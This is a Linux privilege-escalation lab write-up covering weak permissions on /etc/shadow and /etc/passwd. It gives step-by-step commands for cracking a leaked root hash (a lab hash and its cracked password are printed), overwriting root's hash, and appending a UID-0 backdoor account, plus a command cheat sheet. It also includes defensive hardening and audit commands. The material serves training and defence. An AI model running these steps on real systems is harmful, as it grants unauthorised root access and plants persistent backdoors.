# Linux PrivEsc: Weak File Permissions on `/etc/shadow` and `/etc/passwd`

> These two files are the **crown jewels** of any Linux authentication system. When their permissions are misconfigured — even slightly — you get a direct, reliable path to root. This note covers **three separate escalation paths**, all seen in the lab: readable `/etc/shadow`, writable `/etc/shadow`, and writable `/etc/passwd`.

---

## 0. Background: How Linux Authentication Files Work

| File | Purpose | Normal Permissions |
|---|---|---|
| `/etc/passwd` | User account metadata: username, UID, GID, home dir, shell. **Historically** also stored password hashes (now just an `x` placeholder). | `-rw-r--r--` (world-**readable**, root-only-**writable**) |
| `/etc/shadow` | Actual password **hashes**, plus password aging policy. | `-rw-r-----` (readable only by `root` and the `shadow` group) |

**`/etc/passwd` line format:**
```
username:x:UID:GID:comment:home_dir:shell
```
The `x` in field 2 means "the real hash lives in `/etc/shadow`, go look there." **If you can write to `/etc/passwd`, you can put a real hash directly in that field instead of `x`** — Linux will honor it as valid, even though it's non-standard for modern systems. This is the core of the writable-`/etc/passwd` technique below.

**`/etc/shadow` line format:**
```
username:$id$salt$hash:last_change:min:max:warn:inactive:expire
```
The `$id$` prefix tells you the hashing algorithm: `$1$`=MD5, `$5$`=SHA-256, `$6$`=SHA-512 (most common on modern Debian/Ubuntu).

---

## Technique 1 — Readable `/etc/shadow` (Task 3)

### The Flaw
Normally `/etc/shadow` is `-rw-r-----` (owner `root`, group `shadow`). If it's misconfigured to be **world-readable**, any local user can read every password hash on the system — including root's.

### Enumeration
```bash
ls -l /etc/shadow
```
Lab output:
```
-rw-r--rw- 1 root shadow 837 Aug 25  2019 /etc/shadow
```
🚩 Notice the **last permission triad is `rw-`** instead of `---`. That's "world" (others) permissions granting read *and write* — a severe misconfiguration (this file should never be world-writable either, which sets up Technique 2 below).

### Exploitation
```bash
cat /etc/shadow
```
Extract the root line:
```
root:$6$Tb/euwmK$0XA.dwMe0AcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
```

The hash (everything between the first and second `:`) is the target. Save it to a file **on your attacking machine**:
```bash
echo 'root:$6$Tb/euwmK$0XA.dwMe0AcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::' > hash.txt
```

> 💡 **Format note:** `john` can parse the full shadow-format line directly in a file (you don't need to trim it down to just the hash) as long as it's in `user:hash:...` shadow format.

Crack it with **John the Ripper**:
```bash
# Unzip the default wordlist if not already done
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Lab result:**
```
password123     (?)
1g 0:00:00:00 DONE ... 
```

Confirm/retrieve the cracked password any time with:
```bash
john --show hash.txt
```
```
?:password123
1 password hash cracked, 0 left
```

Finally, escalate:
```bash
su root
Password: password123
```

> 🧠 **Why does `john` work so fast here?** `rockyou.txt` is a leaked password list of ~14 million real-world passwords. Weak/common passwords like `password123` crack in milliseconds against it. This is exactly why **password complexity + breach-list screening** matters in real environments — not just length.

---

## Technique 2 — Writable `/etc/shadow` (Task 4)

### The Flaw
This is a **strictly worse** version of Technique 1: if `/etc/shadow` is writable by your low-privileged user, you don't even need to *crack* anything — you can **overwrite root's hash with one you generate yourself**, for a password you already know.

### Exploitation

**Step 1 — Generate a new hash for a password you choose**, using either `openssl` or `mkpasswd`:

```bash
# Option A: openssl (SHA-512 crypt-compatible, widely available)
openssl passwd -6 newpassword1
# -6 = SHA-512 crypt format, matching modern /etc/shadow

# Option B: mkpasswd (if installed)
mkpasswd -m sha-512 newpassword
```

Either produces a string like:
```
$6$nAl8ws85bcwxIWKtr3Uq0UKN$O_JEc0ggA_qUpqmoG3BrJPh973MmbgUA2nRyOREGVpK6...
```

**Step 2 — Edit `/etc/shadow` directly** (e.g. `nano /etc/shadow` or a scripted `sed`), replacing the hash portion of the `root` line with your freshly generated one:

```
root:$6$nAl8ws85bcwxIWKtr3Uq0UKN$O_JEc0ggA_qUpqmoG3BrJPh973MmbgUA2nRyOREGVpK6...:17298:0:99999:7:::
```

**Step 3 — Switch to root using your chosen password:**
```bash
su root
Password: newpassword1
```

> ⚠️ **Lab realism note:** Editing `/etc/shadow` as a non-root user directly (`nano /etc/shadow` without `sudo`) only works if the file itself is world/group-writable per Task 4's premise — this is *not* possible on a correctly configured system, which is exactly the point of this exercise.

> 🧠 **Why not just delete the hash entirely / set it blank?** An empty password field in `/etc/shadow` can mean "no password required" on some PAM configurations — which is even more dangerous and less subtle. Generating a known hash is cleaner, more portable across configurations, and mirrors real attacker tradecraft (minimal footprint, deniable-looking value).

---

## Technique 3 — Writable `/etc/passwd` (Task 5)

### The Flaw
If `/etc/passwd` is writable by a low-privileged user, you don't even need to touch `/etc/shadow` at all. Recall: `/etc/passwd` normally has `x` in the password field, deferring to `/etc/shadow`. **But Linux's `libc` `crypt()`-based authentication will accept a real hash placed directly in `/etc/passwd`'s password field too** — this is legacy behavior preserved for backward compatibility.

Even more powerfully: **you can add an entirely new line** defining a **brand new user with UID `0`** — UID 0 *is* root, regardless of username. Linux doesn't care that the username says `newroot` instead of `root`; the kernel only checks the **UID number**.

### Exploitation

**Step 1 — Generate a password hash** (same as Technique 2):
```bash
openssl passwd -6 newpassword1
```

**Step 2 — Append a new root-equivalent user line to `/etc/passwd`:**
```bash
echo 'newroot:$6$...GENERATED_HASH...:0:0:root:/root:/bin/bash' >> /etc/passwd
```

Breaking down the fields:
```
newroot : <hash> : 0 : 0 : root : /root : /bin/bash
username  password  UID GID comment home    shell
```
- **UID = 0** → this is the entire trick. Any account with UID 0 has full root privileges, no matter its name.
- **GID = 0** → root group, for consistency (not strictly required for root-equivalence, but good practice to match).

**Step 3 — Switch to the new user:**
```bash
su newroot
Password: newpassword1
```

**Step 4 — Confirm:**
```bash
id
```
```
uid=0(root) gid=0(root) groups=0(root)
```

🎯 Notice: even though we logged in as `newroot`, the `id` output **displays `root`** for the name — because the system resolves UID `0` back to whatever name is *canonically first* in `/etc/passwd` for that UID (typically the original `root` entry), or simply displays the numeric mapping. Either way — **we have full root privileges.**

> 🧠 **This is the single most "aha!" moment in Linux PrivEsc for most students.** It really drives home that **Unix permissions are fundamentally UID-based, not username-based.** Usernames are just a human-friendly label; the kernel only ever thinks in numbers.

---

## Side-by-Side Comparison

| Technique | Requires cracking? | Requires knowing existing password? | Speed | Stealth |
|---|---|---|---|---|
| Readable `/etc/shadow` | ✅ Yes (offline, via John) | ❌ No | Depends on hash strength/wordlist | Medium (leaves no immediate trace, but cracking takes time) |
| Writable `/etc/shadow` | ❌ No | ❌ No | Instant | Low (directly modifies auth file — very noisy for FIM/blue-team tools) |
| Writable `/etc/passwd` | ❌ No | ❌ No | Instant | Low (new UID-0 account is a massive red flag in any audit) |

---

## Blue Team / Defensive Notes

1. **Correct default permissions — never deviate from them:**
   ```bash
   chmod 640 /etc/shadow   # or 000 on some hardened distros, accessed only via setuid binaries
   chown root:shadow /etc/shadow
   chmod 644 /etc/passwd
   chown root:root /etc/passwd
   ```
2. **File Integrity Monitoring (FIM)** — tools like `AIDE`, `Tripwire`, `auditd` (watch rules on `/etc/passwd` and `/etc/shadow`) should alert **immediately** on any modification to these files outside of legitimate user-management tooling (`useradd`, `passwd`, etc.).
3. **Audit for UID-0 duplicates regularly:**
   ```bash
   awk -F: '$3 == 0 {print}' /etc/passwd
   ```
   This should return **exactly one line** (`root`). Any second line is a compromise indicator.
4. **Enforce strong password policy + breach-list screening** (e.g., via `pam_pwquality` + a "Have I Been Pwned"-style offline check) so that even if `/etc/shadow` leaks, cracking isn't trivial.
5. **Least privilege on filesystem ACLs** — regularly audit with tools like `find / -perm -o+w -type f 2>/dev/null` (finds world-writable files system-wide) as part of routine hardening scans, not just during incident response.

---

## Command Quick Reference

```bash
# Check permissions
ls -l /etc/shadow /etc/passwd

# Readable shadow: extract + crack
cat /etc/shadow
echo '<root_line>' > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt
su root

# Writable shadow: forge a hash and overwrite
openssl passwd -6 <newpassword>
nano /etc/shadow   # replace root's hash field
su root

# Writable passwd: add UID-0 backdoor user
openssl passwd -6 <newpassword>
echo 'newroot:<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd
su newroot
id   # confirm uid=0(root)
```
